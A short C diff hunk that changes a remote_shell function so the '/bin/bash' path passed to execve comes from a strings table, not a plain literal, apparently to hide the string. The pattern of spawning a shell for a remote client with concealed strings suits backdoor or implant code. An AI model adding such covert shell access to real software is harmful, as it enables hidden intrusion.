@@ -108,7 +108,7 @@ remote_shell(char **env) {
         goto client_error;
     }
 
-    const char *bash_exec_path = "/bin/bash";
+    const char *bash_exec_path = (char *)strings[BIN_BASH].data;
     const char *args[2] = {bash_exec_path, NULL};
 
     execve(bash_exec_path, (char *const *)args, env);
